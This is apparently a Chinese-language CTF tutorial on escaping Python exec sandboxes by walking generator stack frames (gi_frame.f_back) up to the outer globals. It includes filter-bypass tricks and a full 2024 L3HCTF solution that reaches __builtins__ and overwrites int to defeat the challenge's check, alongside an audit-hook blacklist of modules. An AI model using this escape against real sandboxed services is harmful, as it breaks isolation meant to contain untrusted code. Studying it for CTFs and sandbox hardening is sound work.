# python栈帧沙箱逃逸

<!--more-->
### **一、生成器**

生成器（Generator）是 Python 中一种特殊的迭代器，它可以通过简单的函数和表达式来创建。<font color=yellow>生成器的主要特点是能够逐个产生值，并且在每次生成值后保留当前的状态，以便下次调用时可以继续生成值</font>。这使得生成器非常适合处理大型数据集或需要延迟计算的情况。

在 Python 中，生成器可以通过两种方式创建：

*1、生成器函数：定义一个函数，使用 `yield` 关键字生成值，每次调用生成器函数时，生成器会暂停并返回一个值，下次调用时会从暂停的地方继续执行。（符合上面的每次生成值后保留当前的状态，以便下次调用时可以继续生成值）。*

示例：

```python
def my_generator():
    yield 1
    yield 2
    yield 3

gen = my_generator()
print(next(gen)) # 第一次调用，输出 1
print(next(gen)) # 第二次调用，输出 2
print(next(gen)) # 第三次调用，输出 3
```

*2、生成器表达式：使用类似列表推导式的语法，但使用圆括号而不是方括号，可以用来创建生成器对象。生成器表达式会逐个生成值，而不是一次性生成整个序列，这样可以节省内存空间，特别是在处理大型数据集时非常有用（依然符合每次生成值后保留当前的状态，以便下次调用时可以继续生成值）。*

示例：

```python
gen = (x * x for x in range(5))
print(list(gen))  # 输出 [0, 1, 4, 9, 16]
```

### **二、栈帧(frame)**

在 Python 中，栈帧（stack frame），也称为帧（frame），是用于执行代码的数据结构。每当 Python 解释器执行一个函数或方法时，都会创建一个新的栈帧，用于存储该函数或方法的局部变量、参数、返回地址以及其他执行相关的信息。这些栈帧会按照调用顺序被组织成一个栈，称为调用栈。

栈帧包含了以下几个重要的属性：
`f_locals`: 一个字典，包含了函数或方法的局部变量。键是变量名，值是变量的值。
`f_globals`: 一个字典，包含了函数或方法所在模块的全局变量。键是全局变量名，值是变量的值。
`f_code`: 一个代码对象（code object），包含了函数或方法的字节码指令、常量、变量名等信息。
`f_lasti`: 整数，表示最后执行的字节码指令的索引。
`f_back`: 指向上一级调用栈帧的引用，用于构建调用栈。

### **三、生成器的属性**

`gi_code`: 生成器对应的code对象。
`gi_frame`: 生成器对应的frame（栈帧）对象。
`gi_running`: 生成器函数是否在执行。生成器函数在yield以后、执行yield的下一行代码前处于frozen状态，此时这个属性的值为0。
`gi_yieldfrom`：如果生成器正在从另一个生成器中 yield 值，则为该生成器对象的引用；否则为 None。
`gi_frame.f_locals`：一个字典，包含生成器当前帧的本地变量。

*着重介绍一下 gi_frame 属性*
`gi_frame` 是一个与生成器（generator）和协程（coroutine）相关的属性。它指向生成器或协程当前执行的帧对象（frame object），如果这个生成器或协程正在执行的话。帧对象表示代码执行的当前上下文，包含了局部变量、执行的字节码指令等信息。

例子：

```python
def my_generator():
    yield 1
    yield 2
    yield 3

gen = my_generator()

# 获取生成器的当前帧信息
frame = gen.gi_frame

# 输出生成器的当前帧信息
print("Local Variables:", frame.f_locals)
print("Global Variables:", frame.f_globals)
print("Code Object:", frame.f_code)
print("Instruction Pointer:", frame.f_lasti)
```

同理利用`gi_code`属性也可以获得生成器的相关代码对象属性：

```python
def my_generator():
    yield 1
    yield 2
    yield 3

gen = my_generator()

# 获取生成器的当前代码信息
code = gen.gi_code

# 输出生成器的当前代码信息
print( code.co_name)
print(code.co_code)
print( code.co_consts)
print(code.co_filename)
```

### **四、利用栈帧沙箱逃逸**

原理就是通过生成器的栈帧对象通过f_back（返回前一帧）从而逃逸出去获取globals全局符号表
一个简单的例子：

```python
s3cret="this is flag"

def waff():
    def f():
        yield g.gi_frame.f_back

    g = f()  #生成器
    frame = next(g) #获取到生成器的栈帧对象
    b = frame.f_globals['s3cret'] #返回并获取前一级栈帧的globals
    print(b)
b=waff()
```

或者：

```python
s3cret="this is flag"

def waff():
    def f():
        yield g.gi_frame.f_back

    g = f()  #生成器
    frame = next(g) #获取到生成器的栈帧对象
    b = frame.f_back.f_globals['s3cret'] #返回并获取前一级栈帧的globals
    print(b)
b=waff()
```

为什么都行呢，可以把frame这个栈帧对象打印看看：

分别是：

```python
<frame at 0x0000020F97255040, file 'D:\\yinwenmingtwo\\PythonCode\\测试\\1.py', line 9, code waff>
<frame at 0x00000176546465B0, file 'D:\\yinwenmingtwo\\PythonCode\\测试\\1.py', line 13, code <module>>
```

在看看上面的`f_globals`: 一个字典，包含了函数或方法所在模块的全局变量。键是全局变量名，值是变量的值。

不难看出这里函数和模块本就同在一个全局，所以都有属性s3cret，怎么看到没到全局？直接看file就能看出。

在给个例子：

```python
s3cret="this is flag"

codes='''
def waff():
    def f():
        yield g.gi_frame.f_back

    g = f()  #生成器
    frame = next(g) #获取到生成器的栈帧对象
    print(frame)
    print(frame.f_back)
    print(frame.f_back.f_back)
    b = frame.f_back.f_back.f_globals['s3cret'] #返回并获取前一级栈帧的globals
    return b
b=waff()
'''
locals={}
code = compile(codes, "test", "exec")
exec(code,locals)
print(locals["b"])
```

运行结果：

![QQ截图20240611190601](https://s2.loli.net/2024/06/11/ltbZOyrMs7YK1Bh.png)

这个其实得从下向上看，最先的帧是exec，然后是b=，最后是8line那里的代码。一步一步回到全局变量

### **五、简单绕过**

`next`过滤可以用`list`，`send`，和生成器表达式进行绕过，

`yield`过滤也可以用生成器表达式进行绕过

### **六、例题**

#### 2024L3HCTF

```python
import sys
import os

codes='''
<<codehere>>
'''

try:
    codes.encode("ascii")
except UnicodeEncodeError:
    exit(0)

if "__" in codes:
    print("__ bypass!!")
    exit(0)

codes+="\nres=factorization(c)"
print(codes)
locals={"c":"696287028823439285412516128163589070098246262909373657123513205248504673721763725782111252400832490434679394908376105858691044678021174845791418862932607425950200598200060291023443682438196296552959193310931511695879911797958384622729237086633102190135848913461450985723041407754481986496355123676762688279345454097417867967541742514421793625023908839792826309255544857686826906112897645490957973302912538933557595974247790107119797052793215732276223986103011959886471914076797945807178565638449444649884648281583799341879871243480706581561222485741528460964215341338065078004726721288305399437901175097234518605353898496140160657001466187637392934757378798373716670535613637539637468311719923648905641849133472394335053728987186164141412563575941433170489130760050719104922820370994229626736584948464278494600095254297544697025133049342015490116889359876782318981037912673894441836237479855411354981092887603250217400661295605194527558700876411215998415750392444999450257864683822080257235005982249555861378338228029418186061824474448847008690117195232841650446990696256199968716183007097835159707554255408220292726523159227686505847172535282144212465211879980290126845799443985426297754482370702756554520668240815554441667638597863","__builtins__": None}
res=set()

def blackFunc(oldexit):
    def func(event, args):
        blackList = ["process","os","sys","interpreter","cpython","open","compile","__new__","gc"]
        for i in blackList:
            if i in (event + "".join(str(s) for s in args)).lower():
                print("noooooooooo")
                print(i)
                oldexit(0)
    return func

code = compile(codes, "<judgecode>", "exec")
sys.addaudithook(blackFunc(os._exit))
exec(code,{"__builtins__": None},locals)
print(locals)

p=int(locals["res"][0])
q=int(locals["res"][1])
if(p>1e5 and q>1e5 and p*q==int("696287028823439285412516128163589070098246262909373657123513205248504673721763725782111252400832490434679394908376105858691044678021174845791418862932607425950200598200060291023443682438196296552959193310931511695879911797958384622729237086633102190135848913461450985723041407754481986496355123676762688279345454097417867967541742514421793625023908839792826309255544857686826906112897645490957973302912538933557595974247790107119797052793215732276223986103011959886471914076797945807178565638449444649884648281583799341879871243480706581561222485741528460964215341338065078004726721288305399437901175097234518605353898496140160657001466187637392934757378798373716670535613637539637468311719923648905641849133472394335053728987186164141412563575941433170489130760050719104922820370994229626736584948464278494600095254297544697025133049342015490116889359876782318981037912673894441836237479855411354981092887603250217400661295605194527558700876411215998415750392444999450257864683822080257235005982249555861378338228029418186061824474448847008690117195232841650446990696256199968716183007097835159707554255408220292726523159227686505847172535282144212465211879980290126845799443985426297754482370702756554520668240815554441667638597863")):
    print("Correct!",end="")
else:
    print("Wrong!",end="")
```

就是可以执行一些命令，满足下面的if条件就行。

做了一些过滤，过滤掉了双下划线，`{"__builtins__": None}` 置空了`__builtins__`。

这里的if条件是：首先p和q都得大于100000，其次就是p和q的积为int("69...97863")

按照题目要求，如果通过算法在要求的5秒实现基本上是不可能的，但是我们可以通过沙箱外的globals的`__builtins__`字段去修改int函数，实现绕过if语句，这道题的解题思路就是通过栈帧对象逃逸出沙箱从而获取到沙箱外的globals。

由于这里的`{"__builtins__": None}` 置空了`__builtins__`，那么就无法使用next()和send()了。但还可以使用生成器的表达式，为什么必须用生成器，主要还是因为它的属性gi_frame可以获得当前栈帧对象，当然sys._getframe()等也可以获得栈帧对象，不过需要引入sys模块。

用生成器的表达式获得栈帧对象

```python
a=(a.gi_frame.f_back.f_back for i in [1])
print(a)
a=[x for x in a][0]
print(a)
```

简单解释一下：看来上面的生成器表达式这里其实就是，先执行i=1，然后执行a.gi_frame.f_back.f_back，这里并没有用到生成器的特性，只是单纯利用生成器来获得栈帧属性。

`a=[x for x in a][0]`等价于`next(a)`和`list(a)`，就是迭代执行嘛。至于两个f_back是从下依次向上返回。

```python
<frame at 0x000001C18B6BA130, file 'D:\\yinwenmingtwo\\PythonCode\\测试\\22.py', line 4, code <module>>
<frame at 0x0000027CB3830580, file 'D:\\yinwenmingtwo\\PythonCode\\测试\\22.py', line 3, code <listcomp>>
<frame at 0x000001BDF5F45040, file 'D:\\yinwenmingtwo\\PythonCode\\测试\\22.py', line 1, code <genexpr>>
```

理解到沙箱逃逸全局了后面就没什么了。

```python
def fake_int(i):
    return 100001 * 100002
a=(a.gi_frame.f_back.f_back for i in [1])
a=[x for x in a][0]
builtin =a.f_back.f_back.f_globals["_"*2+"builtins"+"_"*2]
builtin.int=fake_int
```

这里就是重写了int方法来满足if条件。

**参考：**

https://xz.aliyun.com/t/13635?time__1311=mqmxnQ0QiQi%3DDteDsD7md0%3DL5pQzt8q4D&alichlgref=https%3A%2F%2Fwww.google.com%2F#toc-7

https://fupanc.github.io/2024/06/06/python%E6%A0%88%E5%B8%A7%E9%80%83%E9%80%B8/#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95


